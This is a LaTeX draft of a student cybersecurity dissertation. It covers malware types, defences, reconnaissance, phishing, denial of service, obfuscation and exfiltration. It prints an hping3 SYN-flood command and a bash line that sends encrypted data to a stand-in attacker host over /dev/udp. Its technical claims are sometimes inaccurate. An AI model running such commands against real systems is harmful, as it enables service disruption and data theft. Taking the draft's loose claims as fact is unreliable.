%!TeX root=Dissertation.tex

%need to focus on liturature more, get my ideas down that dont need substance and then link cold hard facts,

%research all topics deeper than present knowledge! just thoughts for now
%!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!%

%nice boxes https://tex.stackexchange.com/questions/14967/source-code-listing-with-frame-around-code

%------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%

\chapter{The Security Landscape}
\section{The Cat \& Mouse Game}
Technology is always changing, often to the needs of the growing world. Changes range from potential to aid traditional sectors to common conviniences that are taken for granted everyday.
Software usually has a purpose, and that purpose is normally pure in nature. Software is there to solve a problem, to make life easier. A problem arises in implementation however, as mistakes can happen.
The software development process has various stages, the most important of which being testing. Usually testing is conducted in order to identify any potential bugs that might cause issues later.
The quality and extent to which a given piece of software is tested varies from sample to sample, and sometimes bugs slip through.

Bugs can be minor or disterous in nature, and can lead to major problems for those who use it.
The solution is usually to send out an update so that a given bug cannot be exploited any further, but this is not a perfect process. There can be reluctance to update, complacency to the maintaining infrastructure or disregard to the issue at hand.
Once software is out in the wild, it cannot be retrated. Corporate implementations are already built, and can be abused by criminals who take note of the out of date software.

Both issues of a buggy release and slow update responce can essasibated by corporate culture that put strain on the process. Underfunded, unmotivated and untrained workers will struggle to work to their capability and as a result, security can suffer. 
Another potential pitfall is mission critical infrastructure. There could be potential issues with implementation, that cannot be fixed easily due to a 24/7 use window. Another issue is legacy reliance; software may work for a certain OS version only, 
and the new version that is safe could be too expensive or not exist at all. Careful consideration must be give to defence policy, strategy and potential responce in order to stay ahead of the cat and mouse game that is cyber-security.


%references sectors helped, nhs reliance, and programmer stress

\section{Responce Theory}
Responce in security is just as important as any other layer. No system or person exists is perfect, mistakes will happen eventually. Those msitakes should be managed by proper training, as will be discussed in the evaulation.
If issues are inevitable, even with a good culture; what is the proper responce? It varies, but typically a good approach would include simualtions planned out ahead of time of what may happen, with best practise as a responce.
Scenarios are planned out ahead of time in order of likelyhood, preferbly with people dedicted to incident responce. Serperation of duties and planning ahread of time can reduce much of stress and anxiety that can come with cyber attacks or downtime.

Some sensible steps include:
\begin{enumerate}
    \item [$\bullet$] Airgapping of existing infrastructure
    \item [$\bullet$] Checking of logs
    \item [$\bullet$] Aquisition of audit trails
    \item [$\bullet$] Checking of open connections / malware
\end{enumerate}

%should defence in depth be in my evalulation?

\subsection{Zero-Days}
When people think of the exploit-update cycle, the first thought would be of patching. Patching is incredibly important, it allows for security issues to be rectified; to an extent in which it's then up to maintenance. Zero day attacks are incredibly 
potent due to the distinct lack of a patch available. A zero day is essentially a brand new exploit that is suddenly sprung upon the blue team. These exploits can do any amount of damage, with their severity depending on the exploit at hand. 
Zero days are often sold on the dark net for prices that are in accordance with the severity. Zerodium - A company that tracks the pricing of various kinds of exploits prices a Windows 10 remote code execution exploit at around \$1 million. 
The price tag pertains to the huge amount of systems running windows as a base, with an incredibly large surface to implement on.

%reference zerodium, responce stats

\section{Historic \& Modern Malware Threats}
\subsection{Heartbleed}
A heartbeat request asks for a open ssl session to be checked of a given length and content. The length was never checked though so it would read from outside the buffer potentially revealing passwords. Thousands of webservers were vulnerable, including yahoo. A patch was needed to fix this

\subsection{Loveletter}

\subsection{SQLSlammer}

\subsection{Emotet}

\subsection{WannaCry}

\subsection{NotPetya}

\subsection{Mimikatz}


%------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%

\chapter{Defence Technologies}
%stateful and stateless
\section{Variation of Defence Systems}
\subsection{Network Monitoring Capability}
Monitoring is rather important. Particually in a manual capacity; having the ability to analyze the flow of the network can aid in both troubleshooting and manual anomaly detection. The difference in human congnition to a machine's is massive; A machine will think as you tell it to think,
and will not act dynamically unless you tell it how should learn. Humans on the other hand have excellent learning and analysis potential as is. This means it is important to utilize the human element to further harden a network via manual monitoring. 

There are many ways to do this, perhaps with grafana dashboards which import all the key data metrics into one. Another avenue could be to use wireshark (or a similar implementated program) to check what is happening at a particular time. 

For example, if there is suddenly lots of half open TCP or ICMP requests, there may be a DDoS attack. Another reason that a human brain is benefitical is that it has the capacity of content. A flood of HTTPs traffic may look like a DDoS attack, 
but may actually be a holiday like black friday in which you may expect hightened traffic.

\subsection{Firewall Rules}
A firewall acts as a device between hosts and the internet and filter incoming and outgoing traffic. They can be in hardware and software form.

An ACL is a series of IOS commands that control whether a router forwards or drops packets based on information found in the packet header. They can limit network traffic to increase performance, provide traffic flow control to restrict delivery of routing updates to 
ensure they are from a known source, and allow us to restrict part of the network from communicating with another part of the network, while allowing another. We can also block based on traffic type, e.g telnet, while allowing email. ACLs can also be used to tag traffic as priority. 
A VIP pass of sorts. We have inbound and outbound ACLs. Inbound filters packets coming from a specific interface, outbound does the same independant of the inbound interface, there could be multiple. An ACL uses a wildcard mask to select specific groupings to allow or deny access.

The above system uses the idea that only the vpn port is open, with everything else requiring local or vpn access. We use firewall rules to block everything else that is on the same device, such as my dns server. Additonal firewall rules could be used internally to stop priv esc 
but unlikely in a home lan setup. I only allow local devices to even access the public IP other than for the VPN so it is a whitelist, very strong. The firewall is on the same device as the VPN purposely, if the device goes down, the firewall rules do sure, but so does the VPN which eliminates the access anyway.


\section{Threat Definition}
It becomes incresingly important in defence to know what the opposition might try. There are an obsurdly large amount of malware out there, and as such; it's quite important to be able to classify them based off their traits.

\subsection{Classification of Threats}
Malicious software, often called 'Malware' is an ever growing problem for system administrators. There are many threats out there now, and as such, it makes sense to have some form of classification process, a discussion of the categories is 
important. Additionally, it's rather important to understand that the below categories are overarching, and behavior may warrant subcategories. \citep{MalwareClass} 

Firstly, viruses. They act as the term used for all malware as an umbrella term by the general populace.
They require user interaction to start, often binding to otherwise legit applicaitons to act as a trigger. They are less common these days due to the interaction factor, with only 10\% of malware classifying as a virus. They can be quite difficult to clean up due to their infecting nature. \citep{MalwareClass}

Worms act similarly but their main distinguishing difference is that they often don't need user interaction to trigger and will reproduce themselves over a network. Loveletter and SQLSlammer are a fantastic examples of this, showing that the internet's vast connectivity
can lead to a worldwide compromise in hours given the right circumstances. \citep{MalwareClass} 

Trojans are by far the most common pick as of writing for a budding computer hacker. They similar to viruses in that they interact with applications, and that they both require some user interaction to start. The differences lie in behaviour before and after infection. 
They prefer to masquerade as legitimate programs, that upon exection, do something different entirely, or serve a secret purpose to just what the cracked software or emailed document that was inevitably downloaded for. They do not replicate, prefering to create C2 structures with backdoors,
and employ remote access trojan tactics (RAT) of creating persistance, often in the form of covert screensharing. \citep{virusVsTrojan}

%Find something to backup RATs

Rootkits are pieces of malware that share similar traits to that of other classifications of malware, they cannot replicate on their own, and employ c2 structures for remote commands and file execution. 
Their defining trait comes in how they are implanted, and their reach. They tend to burrow rather deep into the system, usually completely hijacking core operating system functions, or even implanting into the BIOS.
They typically have high levels of access to both software and hardware with even cases of rootkits being found in malformed firmware. They are difficult to detect and harder to get rid of, with people ususally having to either scrap, or deep
wipe hardware. \cite{MalwareClass02} 

You also have malware that is classified based more on the damage caused, rather than the transmission or retransmission methodology. A non extensive list would inlcude adware and spyware. Adware will reach your machine through one of the above mediums
and infect key parts of the operating system. The goal is to sideload web content into vison, preferbly where they would be expected normally. 

Ads are how much of the internet makes money, and as such if a strain of adware can infect many machines, there is a great financial incentive.
Areas hijacked often are javascript elements, browser toolbars, page redirects and notifications. Not to be confused with malvertising where advertising networks are the infection vector. \citep{MalwareClass} 

Secondly, as stated, there is spyware. Much like adware, it will get onto the system in a given way and will then trigger. The trigger in this case is surveillance. This may include sending
keyinputs, browsing history, webcam streams, mic inputs and even implement RAT behaviour to get a live stream of their desktop. cite{MalwareClass02}  \citep{MalwareClass} 

%keyloggers, internet history scrapers etc.. Somewhat linked to RATs

%\subsubsection{Fileless/Packetted}
%might need a tad bit of research for this one, more than the above.

There are many more, some of which will be discussed at relevant parts of the paper.

%consider moving stuff here

\section{Anomaly Detection}
\subsection{Machine-Learning}
Machine learning is a relativly new technology, that aims to reform the programming process. Typically with software engineering, the end algorithm is explicitly laid out; often encompassing every concievable scenario.
This methodology is easier to implement at a basic level but challenging to scale, and suscepitble to human bias. Machine learning differs in that an environment is given, a dataset assigned and simulations are ran. 
Tweaks are made on the fly, by both human and the program itself. This can help expose amazing discoveries that a human would struggle to find, along with a system created that can detect and prevent proactivly.
\subsubsection{Protocol Adaptation}
Different protocols work in varying ways. An approach that monitors them in the same capacity is sure to fail, due in large part to the variation of data handling. Defensive systems must be able to identify the protocol,
be aware of it's legitimate use, as well as signs of tampering. For example, detection systems should not treat a HTTP packet the same as they would ICMP. Their threat potential is quite distinctly different, and as such;
it is important that part of the learning process is dedicated to finding the normal. Anything that deviates from the "normal" is consiered an anomoly, and can be acted upon in a given set of ways.
\subsection{Signature \& Pattern Matching}
An interesting question could be made. What is considered a threat to a computer? The simplest answer is "something that is predefined". 
In computer science, a method of validating integrity is to use a process called hashing; a process in which no two pieces of data can return the same value. 
There are various algorithms out there, some of which are broken like MD5, meaning they can be abused to return the same value for multiple datasets. 
If data can be represented as a value, then that value can be checked conditionally for a match against a database. This is the fundamental idea behind signature analysis,
most commonly used in anti-virus technologies, as static analysis.

%reference encryption

\subsection{Behavoural & Dynamic Analysis}
Polymorphic encryption and malware versioning has historcly shown that static analysis is not enough, it is an important part but cannot stand on it's own. The idea behind dynamic detection is that rather than
studying the data at rest, analysis is conducted on either the running malware, or a simulated version of it. Ultimatly malware across versions aims to do the same task, albiet in slightly differing ways. If the methodology
can be identified; the malware can be defeated. This requires a much more skilled approach; A comparison of before and after. ProcMon on Windows is excellent for this; it will let you see what registry keys have changed, what files are new and any peculiar processes.
Machine learning has been leading the charge in this field, as well as automatic siganture matching.

%reference studies on this! procmon research too

\subsection{Whitelist vs Blacklist Approach}
The choice of a white vs black list is one that depends on infrastructure design. Abstractly, it depends on the approach; if their are many unknowns in the system, a blacklist may have to be used. 
Similarly the inverse is true. Research shows that a whitelist approach is preferntial for security though more specific in implementation. Whitelistng in this sense refers to a predefined set of hosts
that are allowed access to a given device, rather than a "find and block" approach of a blacklist. Whitelisting requires full knowledge of present and future variables in the network, whereas blacklisting
allows for easier expansion. Blacklisting is more suscepitble to hacking due to the nature of simply altering the threat to bypass checks; something that whitelisting may prevent. Zero day exploit control is 
highly dependant on systems only having required access, something that when planned properly, can use a whitelist approach. The approach will vary across the network and as such proritization of security 
and looseness of security for usability must be considered.


\subsection{PoC IDS Objectives (It must..)}
\begin{enumerate}
	\item \textbf{Detect network interfaces}
	\item \textbf{Bind to a network interface}
	\item \textbf{Capture data and output to a file/standard output}
	\item \textbf{Flag up unusual activity from a few notable attack types}
	\item \textbf{Control via command switches}
	\item \textbf{Be well written and meaningful to the idioms of the language}
	\item \textbf{Have testing/design documentation}
	
\end{enumerate}

%------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%

\chapter{Entry Vectors \& Profiling}
\section{Exposure \& Scanning}
The internet is about freedom of oppotinity, and is why so many companies have succeeded. Services are accessible and convinient. The ability for anyone to access a service is 'double-edged'.
If anyone is able to access it legitimatly, it allows potential for a threat actor to conduct their processes also. The first prcoess is often enumeration and scanning. Attacks are much more effective when they are meaninful, scoped and targetted.
A criminal can use information gathered to hone in later attacks for full effect.  

\subsection{NMAP}
Nmap is an extreamly useful networking application that allows for a great deal of network reconnaissance. It's main use being the mapping out of networks, as the name would suggest.

Host Discovery Scan (Subnet Scoped):
\begin{tcblisting}{listing only}
    nmap -sn 192.168.1.1-254
\end{tcblisting}

Noisy Host Probing Scan:
\begin{tcblisting}{listing only}
nmap -sC -sV -vvv -oA  ~/Documents/nmapscan.txt 192.168.1.50
\end{tcblisting}

%other tools listed in ToR

\subsubsection{Fingerprinting \& Banner Grabbing}
A threat actor can learn much from a network, particually if it is widely exposed to the internet. Valuable enumerated data includes: software names and versions, operating system patch numbers, open ports and typical responce.
Much can be learned based off how software responds. It could respond in a way that is particually unique, allowing for identification. This could be a message, or typical behavior for that piece of software.
This probing is called banner grabbing and is one of the first steps in any hacking endevour. A typical example is a web server; if a http request is made on port 80, there will likely be a http responce (assuming the port is open).
That page in such case would be a vector for identification, with the web server also having poptential for version disclosure with default files. Another potential way to identify wouold be to use a standard ping function. 
There is fingerprinting capability built into the variable implementation of the ICMP protocol. Different operating systems have differing ping responce times, which gives away the platform. 
This is impactful as OS version and architecture disclosure means exploits are filtered down to those more likely to work.

These are trivial examples, but show that exposure can lead to the "hacker mindset" being utilised.

%icmp responce time, apache default page w version

\subsection{Firewalking}

\subsection{Network Pivotting}
One of the most potent traits of malware (particually worms) is their ability to spread rappidly. Once malware has a foothold in a network, it can take advantage of the networked nature of infrastructure to check what that machine can talk to.
It can then conduct either manual or automatic network reconnaissance and enumeration, with the hope to find a vulnerable service to exploit. The advantage of hacking multiple machines is that they cna have different levels of security and access, 
leading to potential privilege escalation. 

The Metasploit Framework has a program called meterpreter which allows you to run modules using the victim system, and push it through by binding to a process. The process binded to depends on the architecture and software security level, but is dangerous
because it means that the tools on the system are fairly irrelevant. 

\subsection{CVEs \& Shodan}
Exploits are common, and are numerous. There are way too many to know by name or nature. There is a need for a standardised classifcation; this exists in the form of "Common Vulnerabilities and Exposures (CVEs)". A CVE is essential a unique record for a given vulnrability,
often used in the cybersecuiryt industry for disclosures and reference. Each CVE is registed in the database (can be found at exploit.db) and is given a severity score, known as the CVSS score. Often exploit implentations and proof of concepts are provided with disclosure of a CVE, that sometimes vary.
There is a culture in the security scene of who can have the most covert and efficent exploit for a given vulnerability. An outside perspective may use the argument that this is harmful to security. While this is true in some circumstances, tools and exploits are able to be created and exploited regardless of legality.
The security consensus typically is around pushing security boundaries through testing and not leaving it up to chance. 

%https://www.balbix.com/insights/what-is-a-cve/#:~:text=CVE stands for Common Vulnerabilities and Exposures.

Shodan in conjuction creates a very deadly pair. Shodan is a internet connected device search engine that allows fine tuned filtering.
Shodan does not explicitly scan, instead reporting back what is already publcially available, even if tricky to find naturally. What forms is a database that 
tracks operating systems, software and versions of devices all over the world. This can be used in conjuction with a compatiable CVE to potentially compromize a network.
The inverse is true, it can be an asset to create awareness of exposure and help push security forward as a result.

%reference shodan, discission of leagility of use of tools and stuff 

\section{Social Engineering}
Social engineering is the art of exploiting the inherent vulnerabilities that lie within humanity. Access is most easily leveraged by manipulating someone, especially compared to finding the needle in the haystack regarding finding a relevant vulnerability at the machine level. 
Consider the example in which the main company database has been secured; all the software is up the date, the passwords strong and properly stored as hashes. What if instead of traditional hacking methodologies, someone simply walked in with a high visibility jacket and walked out with the system, 
citing maintenance as the reason. \citep{AssignmentSecurityForensicsPaper}



\subsection{Phishing}

There are two main strands of phishing. The kind you are most likely familiar with is simply called phishing, and pertains to the act of sending a victim to an impersonated site with the intention of them putting real credentials and info down. 

The second being spear phishing which is the same with one main difference. That difference being the scope and scale. A normal phishing attack tends to be widespread, generic and assuming. The spear counterpart prefers to use reconnaissance to tailor make the email into something that fits them. The goal being to exploit some kind of weakness for a higher payoff via privileged users such as CEOs and unsuspecting admins.

Every website uses HTML files in some form. These usually can be replicated with proper CSS that is in public view. This means you can create a site that looks exactly like paypal for example, with the idea of the victim typing their real credentials in, 
which goes directly to the hacker's server. There are usually entry points to this, a sophisticated one is where "free wifi" is set up, someone connects to it, is sent to a login page that you made where they register and type their credit card info, 
as if they were the real hotel for example. It can be used in conjuction with DNS phising below to make them indistinguishable at times.

Such attack could also be used to distribute malware in a drive-by attack as talked about. The legit site likely would never have such code, but the custom one very much could. This can lead to much greater consequences. The thing that is fairly scary about this is how easy it is to setup a DNS server. You can even do so with a raspberry pi in about 10 mins for example.

A combination of the above could be used here, to hijack a DNS server to point to this, a cloned website, with a different premade template:

Spear phishing is where you send email enmasse to lure people into clicking some form of link or file. They are often non targeted and usually aim to trick the victim with techniques like urgency, trust and fear. The idea of these campaigns are not to trick everyone, 
in fact as a whole very very few people fall for it. You will get your small minority that it works on, and that's what they rely on. The solution to this is proper email sanitization, with checks of email header tampering, some form of verifcation and file/link whitelists.

\subsection{USB Dropping}
USB devices carry data in a convinient way through flash storage. They are cheap, quiet and very portable. They can be encrypted and are a great asset to productivity. 
There are however security concerns around a specific use case of them. Some models of USBs allow for firmware altering; altering that allows some tools to configure it to trick
devices it is plugged into it, that it is a keyboard. 

Keyboards can obviously type, with keyboard input being inherintly trusted. Input is usually dictated by scripting (commonly 'ducky script')
with typing that is far faster than a human can write, or even read often enough. A victim may plug it in, see a black command prompt window and have a potential compromise without even knowing. 
The script could do any manner of damage, usually a payload based off the topics covered in this paper. 

The attack preys upon the human emotion of curiosity, as these usbs are usually either dropped outside randomly and picked up or given in seemingly good faith. Another interesitng point to consider is supply chain.
Every usb has to be made, and therefore should be a trusted retailer with regular random testing. A cheap 2tb usb stick off ebay may not be the best idea, especially considering that reported device size can be faked to the operating system,
where it will overwrite itself past it's threshold.

%reference stuxnet
%\subsubsection{Autorun}
\section{Address Spoofing}
In most cases, networks rely on some form of addressing. Addressing allows for scope of computation, and to direct traffic to a given destination. 
Addressing can also be used for conditional statments, commonly for the implementation of firewall and switch port security rules. Outside of additionally validation of identity, addressing
is considered absolute, and is inherintly trusted. \citep{IPMACSpoofing}

In this sense, the question becomes, can you place a malicous server in the network and pretend to be an allowed IP address? It is posisble and is called IP spoofing. A DNS server could be removed from the network, allowing for a threat actor to take it's IP address, 
which in turn allows for potential compromise of clients. Active directory is a domain controller platform developed by Microsoft, that aims to manage access of users and groups to resources. If this were to be compromised, it would be disasterous. 
The reason being that IP addresses are intrinsicly tied to domain names, and as such, a spoofed IP, also leads to a falsified domain, which propogates between internal infrastructure. \citep{DNSSpoofing}

Another important concept pertains to a specific manipulation of access control lists. Infrastructure tends to follow networking trends, i.e using schemes starting with 192.168.x.x or 10.10.10.x. This knowledge combined with reconnaissance can be used to map out what is normal inside the network.
If a detection/prevention system treats WAN and LAN the same, a threat actor could pretend to be 192.168.x.x, of which a gateway firewall rule exists to allow access. This fault comes from lacking configuration of which side of infrastructure traffic is coming from. 
It is reasonable for private IP space traffic to be allowed within for hosts that need it, but said rules should be scoped only to LAN, unless absolutly nesessary. There are cases where some insecurity cannot be avoided, in such cases defence in depth is paramount.

The above pertains to network layer validation, in which an IP address is targetted. The same can be done for the data-link layer, in the form of MAC addresses. MAC addresses can be leveraged to control access to the network, and are useful because they are globally unique and have a vendorID that can be filtered.
This could mean that you could only allow certain MAC addresses to talk to a router for example. This means that even a spoofed IP would not allow access, however, it is possible to fake a MAC address too, using 'macchanger'. The malicous node could pretend to be on which is allowed, and therefore gain access for communication. 
This can be accomplished with the tool 'macchanger'. \citep{IPMACSpoofing}

The above approach would depend on the access control system in place. If there is a whitelist, the above method would have to be used, which requires knowledge of allowed MAC addresses. If a blacklist is in place, a device could simply use the tool to switch it to something that is not on the block list, perhaps by changing the vendor. If the blacklist is aggressive, and dynamic, then macchanger can be leveraged to respoof the MAC on each boot.


%------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%

\chapter{Malware Mechanisms}

\section{Command \& Control}
Malware tradiotnally is static, meaning that it executes a given task and then finishes. Malware that can be maleable is an asset to a cyber criminal. 
Some malware has since adapted a command and control model, often shortened to CC or C2. Such model dictates there are 'zombie' machines and a respective master, a master whom sends commands for the zombies to conduct. A botnet.

No longer is malware a sequential process in such case, a threat actor could order it's army to carry out any number of malcious actions. Such systems do have advantages; A large army can do major damage to vulnerable systems, whether in the form of denail of service or otherwise.
Another reason to use a system such as this is that it creates a layer of pseudo anonmyity. The zombies are conducting the attack; not the master technically. Defence systems would flag up the attackers directly, with the real threat actor getting away with the attack potentially.

A few things of note; systems are usually zombies without knowledge through some kind of botnet malware. Additionally, if analysis is conducted of a zombie machine (perhaps an aquisistion of a cloud virtual machine), then the communiccation channel may be clear. Proxy chains can help avoid this, creating more layers of relay.

\subsection{Side Channels}
\subsubsection{Bind & Reverse Shells}
A Bind/Remote shell is you connecting from your machine to the shell. This is more of a backdoor. This is usually blocked by firewalls and can be ruined by change of ports, additionally DHCP and NAT cause IPs to change and as a result you do not know the IP of the listener you have setup.
A reverse shell is the shell connecting to a listening service (Netcat) on your machine.

Netcat lets us set up connections between a host and a listener. You can also connect to any listener that is not yours also, which is referred to as banner grabbing, simply using nc on a ip port can do this. 
A useful. 

Let’s say we have found a remote code execution (RCE) vulnerability on the target host. We can than issue the Netcat command with –e on the target host and initiate a reverse shell with Netcat to issue commands.

MSFVenom

Reverse shells can be over TLS

%reference zeus, mirai
%pwncat - bit noisy tho


\subsection{Denial of Service}
This attack makes use of the simple fact that downtime for a server or host can often cause frustration and in many cases loses people money. This means to some people there is an incentive to be able to do this. The general idea is that if you flood a host with enough ICMP (ping) traffic, it will halt and not be able to process anymore information, this is not only for the attacker but for everyone. This would be considered a DOS attack. 
This usually can't do nearly as much damage as the next version can. 

The attack I am meaning is the Distributed Denial Of Service or DDOS attack. This uses the same concept but with a network of attacking machines all linked together. This could be a large number of machines the attacker owns or zombie machines that the attacker has gained control of with malware and is using for their attack. This multiplies the scale of the attack up to thousands sometimes and is a real problem; it can take down industry 
standard servers if care is not taken to analyse what traffic is coming in.

A DoS attack in the confines of this paper, is the process of sending ICMP requests on mass to a host in the hope of slowing or taking down a service. The reason this is potent is that the host cannot ignore the echo request, it must respond to it by default. This creates overhead in the parsing processes which take resources, in the form of CPU time and RAM. The attack lessens the resource pool for other services, making them struggle. 
It tends to be that a great number of ICMP packets of moderate size must be sent for the desired outcome.

There is a concept of a distributed denial of service or DDoS attack which makes use of multiple attacker machines to take down a target host. The general idea is that when the number of attackers increases, the number of ping requests tend to as well. This brings about the result faster and for longer. This is possible in part because the machines each have their own network interface, which is flooding the target system as fast as possible. 
The fact they are coming from different sources creates a larger overhead. DDoS is very commonly conducted by hackers using a ‘botnet’. A botnet being several machines that are under the control of the threat actor, usually through nefarious means like malware infections. This is normally without the real user’s consent or knowledge. The botnet works for two reasons; distributed hardware for maximum potency and concealment of the true attacker. 
There are many forms of DoS. ICMP flood is the main focus, but others will be discussed for context and scale. 

There are TCP based attacks in which a 3-way handshake is initiated and stopped after sending a SYN packet and receiving a SYNACK back. \citep{DoSMit}. 
Do this enough and there are thousands upon thousands of half open connections that are taking resources. In some ways this is harder to spot that ICMP and simply disabling TCP could be very detrimental. TCP is so integral to even basic functionality in a lot of applications that infrastructure could just fall apart logically. \citep{DoSExplained}
Then there is perhaps the deadliest form of digital DoS, custom packet crafting. In this attack the hacker would create custom packet headers that have certain flags enabled, that would never normally be enabled together. This makes the recipient very confused, which is dangerous. An unpredictable system could do anything. It is equivalent to inputting a number into an upper-case check program. 
It would be hoped that the programmer would have accounted for edge cases of malicious or accidental input, but you cannot guarantee it. There are sometimes application specific exploits which take advantage of the fact that data is stored internally with overflow potential. Similarly, there used to be attacks around that sent malformed packet size in fragments to overload and bypass OS level size restrictions to take down systems. 
This is called the ping of death and has been fixed for a long while but remains to be good context none the less. \citep{ICMPFloodDetPrev}

There are other more direct types of DoS, namely an attacker cutting off the internet or even stealing hardware to prevent service. There are even types that are legal, and unavoidable such as the concept of company competition. If a rival company who offers a similar service opens, that is denying service in a very abstract sense.
The point being is that Denial of Service alone is a type of attack rather than an attack itself and should be considered in every facet of infrastructure and security development, rather than only in a single place.
\citep{AssignmentDOSPaper}


\section{Data Cryptors}
Data is our most valuable asset, with much of it being irreplaceable. This is true for both home and corporate users of technology. There is no feasible retaking of a deceased loved one's photo, or the reaqussition of millions of customer records. This is the sad reality of what data cryptors target.
There are two main motivations for an attack of this kind, one in which access to given data is removed, often permenantly. 

Firstly, Ransomware. The goal is to encrypt as much data as possible with a randomized key, rendering data unless without said key. The attackers then offer the key in exchange for a large ammount of money, often in cryptocurrency for anonymity. Distressed victims may then pay the ransom and may or may not get their data back.
There is controversy at the time of writing about paying the ransom, which gets even more complicated by the 'professionalism' tgat is evolving into the very lucrative ransomware buisness. The idea being that if an attacker group has 24/7 live chat and customer serivce, they are even more likely to hand over money.

Secondly, encryption for destruction. From time to time there are attacks that are not in it for direct financial gain, rather obstruction and distress. This variant encrypts just the same, with a few notable differences. There is no ransomw, the key often is not transmitted and it is more liked to corporate rivalry or hacktivism.

%prove claim of the value of data

\section{Buffer Overflows}

%------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%

\chapter{Malware Mechanisms - Obfuscation}
The idea being to muddle up the binary, making it really hard to analyze. There are certain details that are criticial, IP addresses, URLs, locations, registry keys. Onfuscation is inherintly dependant on some creativity, and so,
this list is not intended to be comprehensive, but shows the fundamental behaviours they all exhibit.
    \item [$\bullet$] Unescape String
    \item [$\bullet$] From Hex
    \item [$\bullet$] From Charcode
    \item [$\bullet$] From XOR
    \item [$\bullet$] XOR Bruteforce
    \item [$\bullet$] Text Encoding BruteForce
    \item [$\bullet$] From quoted printable
    \item [$\bullet$] Magic
\end{enumerate}

\subsection{Steganography}

\section{Encoding vs Encryption}
Encoding is a process in which we represent data in a different format. A simple way to think of this is that A = 1, B = 2. Data representation works in the same way,
base 10 number systems (decimal) can also be represented in base 2 (binary), alongside many others. The data isn't technically changing value, only how it is overtly interpreted.
Encoding is often used for compression of data, base 16 (hexidecimal) is particually useful for this as each place vlaue represents two bytes, saving key space. Base64 is another common one, that is used in
Youtube video URLs as it provides a large unique video ID range, and also means that unlisted videos cannot be sequentially guessed.

Encoding can also be used for hiding data, relying on the fact that whoever will see the data, will not understand it's meaning and encoding type.
This means that clear text can be hidden, stopping people who may come across the data in transmission. The major downside of encoding is the lack of variability of security.
It does not use a key, and is therefore the same each time. Any system that is reversable without a key, is inherintly insecure. As a result, encryption can be used if the data is of importance

Encryption is the prcoess of producing cipher text from a given input dataset, using a specifided algorithm that provides different output for every key. The key is the important part here,
while the process is reversable, it requires a key that is outside of the parameters of the static algorithm. This does a great deal for security abstractly, but very much depends on the algorithm and key size used.

\begin{lstlisting}[label=EncodingVsEncryption,captionEncoding vs Encryption]
Command =  hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com

To Base64
    Output = HBpbmczIC1jIDEwMDAwIC1kIDEyMCAtUyAtdyA2NCAtcCAyMSA
             tLWZsb29kIC0tcmFuZC1zb3VyY2Ugd3d3LmhwaW5nM3Rlc3RzaXRlLmNvbQ==

To AES 256
    Key = bd7239a02424cd86bd7239a02424cd86bd7239a02424cd86bd7239a02424cd86
    IV = dab1efbf1d596f73c0e5e1b4486b6178
    Output = d15304958943bc2190ab10bbca29a6c0171e5af4347d3c4a4855bc048efb
    bd971
    92a46baaecbbac55073b72766c25faf90da1c5f386dc1201451b6e5576798a2439988
    5112ff1684fa4ac31a1161d72ad66f44ebbaebd05e727f362e15f30315

\end{lstlisting}

%explain briefly the dos command

The IV is also of note in the above example, it relies on the Cipher Block Chain (CBC) mode which uses it as a second key. It is a similar concept as a salt for a hash, and means you need both keys to actually decrypt the data.
This makes the job of the defence much harder. It means that not only do you need to know the encryption, you need the mode, key, and possibly IV too. Base64 is sometimes used by malware, but can be easily spotted, as the ==
 at the end is a base64 characteristic.

\subsection{Polymorphic Encryption}
In this sense, the data, the encryption algorithm and the password can all change, while maintaining the goal of the algorithm.
It is clear however that while hashing of the source will not work, you can fingerprint and monitor the actions it would take, and identify based from that.
Sometimes the decryption methodology and code was actually hashed, and detected based on it. There are ways around this too in one of the links.

Polymorphic data that is muddled:
\begin{enumerate}
    \item [$\bullet$]Filenames
    \item [$\bullet$]Encryption keys
    \item [$\bullet$]Unsplit strings
    \item [$\bullet$]File types/extensions
    \item [$\bullet$]Anything that is identifiable
\end{enumerate}

It is very common for malware to have an encrypted payload, with a stub decrypter that acts in memory and bypasses static analysis

Dynamic analysis may detect this based on the actions conducted. AV can set up a visualised environment in which it runs through what the program would do if ran, match it against 
known activities regardless of hash, and look at decrypted memory.

This can be defeated (like everything), by having abrupt delays to throw the system off, lets say before and after decrypting, or overloading memory with junk to throw it off

%------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%

\chapter{Malware Mechanisms - Exflitration}
Modern malware are often not static, it changes and morphs based on remote command. For this to work, there must be some form of communciation from victim to attacker. As discussed above, their is usually a side channel for this.
In C2 structures, it is often advantagous for communciations to be covert and unreadable, as to not create a breadcrumb trail back. 

Data can be pushed over the network, usually in the form of UDP or TCP traffic. 

\begin{lstlisting}[label=EncodingVsEncryption,captionEncoding vs Encryption]
    echo "d15304958943bc2190ab10bbca29a6c0171e5af4347d3c4a4855bc048efbbd97192a46baaecbbac
    55073b72766c25faf90da1c5f386dc1201451b6e5576798a24399885112ff1684fa4ac31a1161d72ad66f
    44ebbaebd05e727f362e15f30315" > /dev/udp/malicious.example.com/80
\end{lstlisting}
%maybe put image in?

In the above string, the previously encrypted string is sent over the network using bash's network device. UDP on port 80 was chosen for our example server

The above string is enrcypted at rest, but another layer at transit would be ideal to obfuscate the traffic's purpose.

\section{Geo Location Altering}
As discussed, it is important to conceal the location of the real attacker. It is common in a C2 structure for zombie machines in the botnet to conduct the attacks. This in essence is a proxied attack,
as the zombies are attacking in place of the master. Proxy chains come in due to the need to remove the direct link from master to slave machies, adding multiple layers of proxy relays all around the world 
in between all communication either way. This means if a zombie machine was captured, authorities may only see communciation to a random cloud host, whom then talks to another random cloud host. It increases the
difficult expinentially for law enforcement to find the criminal, as there are a whole assortment of laws that cause issues for accessing cloud services, when traditionally a live capture was all that was needed. 


TOR is anoter endevor that is intended to escape censorship and monitoring, that is also used by criminals to hide their real location. It runs using onion routing which ensures that the host is not linked to the destination by
bouncing traffic through over nodes on the tor relay, that scan all across the globe. The specifics are out of scope for this paper but the concept is that the client communicates with a onion based directory server, the first router is
